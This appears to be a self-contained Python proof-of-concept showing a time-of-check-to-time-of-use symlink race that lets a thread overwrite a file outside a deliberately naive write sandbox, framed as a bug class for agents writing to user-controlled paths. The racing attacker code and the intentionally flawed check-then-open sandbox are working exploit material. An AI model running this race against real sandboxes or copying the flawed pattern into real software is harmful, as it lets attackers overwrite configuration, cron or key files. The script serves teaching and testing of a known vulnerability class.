#!/usr/bin/env python3
"""
TOCTOU Symlink Sandbox-Escape Proof-of-Concept -- WRITE PATH
=============================================================

Demonstrates the same time-of-check-to-time-of-use (TOCTOU) race as
`toctou_escape.py`, but on the **write** path. A naive sandbox validates that
a user-supplied path stays inside a restricted root, then later opens that
same path for writing. Between the check and the open, an attacker swaps the
directory entry so the validated path now resolves through a symlink to a
file **outside** the sandbox root -- and the sandbox then writes attacker-
controlled content there.

This is the bug class behind write-oriented sandbox escapes: an agent or
service that writes configuration, logs, or data files based on LLM/user-
controlled paths can be redirected to clobber files outside its intended
root (e.g. overwriting a config, a cron entry, an authorized_keys file, or
any path the process has permission to write).

Usage:
    python3 toctou_write_escape.py

Self-contained: creates its own sandbox root and target file inside a temp
directory and cleans up. Safe to run.
"""

import os
import sys
import tempfile
import threading
import time


class NaiveWriteSandbox:
    """A deliberately naive sandbox with a TOCTOU bug on the write path."""

    def __init__(self, root):
        self.root = os.path.abspath(root)

    def _is_within_root(self, path):
        """Check: resolve symlinks and confirm the result stays in root."""
        try:
            real = os.path.realpath(path)
        except OSError:
            # During the race the attacker may transiently create a symlink
            # loop (realpath raises EINVAL). Treat that as "not within root"
            # so the check fails closed; it is not a security hole.
            return False
        return real.startswith(self.root + os.sep) or real == self.root

    def write_file(self, path, content):
        """Write content to a file, enforcing it must be within the sandbox root."""
        # CHECK
        if not self._is_within_root(path):
            raise PermissionError(f"Access denied: {path} resolves outside sandbox")

        # USE (TOCTOU window between the check and this open)
        with open(path, "w") as f:
            f.write(content)


class WriteAttacker:
    """Races a symlink swap so the validated write path escapes the root."""

    def __init__(self, root, victim_path, target_path):
        self.root = root
        self.victim_path = victim_path      # path the sandbox believes is safe
        self.target_path = target_path      # file OUTSIDE the sandbox to clobber
        self.stop = threading.Event()
        self.attempts = 0

    def run(self):
        """Continuously toggle victim_path between a benign file and a symlink
        to the target file, racing the sandbox's check-vs-use window."""
        # Start with a benign regular file so the check passes.
        with open(self.victim_path, "w") as f:
            f.write("benign\n")

        while not self.stop.is_set():
            self.attempts += 1
            # Swap: atomically replace whatever is there with a symlink to the
            # target. os.replace avoids the remove-then-create race with the
            # sandbox's own open(path, "w") recreating the file.
            try:
                os.remove(self.victim_path)
            except FileNotFoundError:
                pass
            try:
                os.symlink(self.target_path, self.victim_path)
            except FileExistsError:
                # The sandbox recreated the file between our remove and symlink;
                # replace it atomically instead.
                try:
                    os.replace(self.victim_path, self.victim_path + ".tmp")
                    os.symlink(self.target_path, self.victim_path)
                except (FileNotFoundError, FileExistsError):
                    pass
            # Swap back: replace the symlink with a benign file.
            try:
                os.remove(self.victim_path)
            except FileNotFoundError:
                pass
            try:
                with open(self.victim_path, "w") as f:
                    f.write("benign\n")
            except FileNotFoundError:
                pass


def main():
    workdir = tempfile.mkdtemp(prefix="toctou-write-demo-")
    root = os.path.join(workdir, "sandbox")
    os.makedirs(root)

    # The target file lives OUTSIDE the sandbox root. It holds a value the
    # sandbox must NOT be able to overwrite -- e.g. a config, a key, a policy.
    target_path = os.path.join(workdir, "config.ini")
    with open(target_path, "w") as f:
        f.write("mode=secure\n")

    # The path the sandbox will be asked to write; it lives inside root.
    victim_path = os.path.join(root, "data.txt")

    sandbox = NaiveWriteSandbox(root)
    attacker = WriteAttacker(root, victim_path, target_path)

    # Sanity: the sandbox correctly rejects writing through a direct symlink.
    os.symlink(target_path, victim_path)
    try:
        sandbox.write_file(victim_path, "mode=compromised\n")
        print("FAIL: sandbox should have rejected the direct symlink")
        sys.exit(1)
    except PermissionError:
        print("OK: sandbox rejects writing through a direct symlink")
    os.remove(victim_path)

    # Start the race.
    t = threading.Thread(target=attacker.run, daemon=True)
    t.start()

    print("Racing the TOCTOU write window...")
    clobbered = False
    deadline = time.time() + 3.0
    while time.time() < deadline and not clobbered:
        try:
            # The sandbox believes it is writing to data.txt inside the root,
            # but the attacker may have swapped the path to a symlink to
            # config.ini outside the root.
            sandbox.write_file(victim_path, "mode=compromised\n")
            # Check whether the OUTSIDE target got clobbered.
            with open(target_path, "r") as f:
                if "compromised" in f.read():
                    clobbered = True
                    print("\n=== SANDBOX ESCAPED (WRITE) ===")
                    print(f"Overwrote file outside the sandbox: {target_path}")
                    print(f"Attempts: {attacker.attempts}")
        except (PermissionError, FileNotFoundError):
            # Expected during the race (check caught it, or file was mid-swap)
            pass

    attacker.stop.set()
    t.join(timeout=1.0)

    if not clobbered:
        print("\nNo write-escape in this run (race is timing-dependent).")
        print("The vulnerability is real; the window is just narrow on this machine.")
        sys.exit(2)


if __name__ == "__main__":
    main()
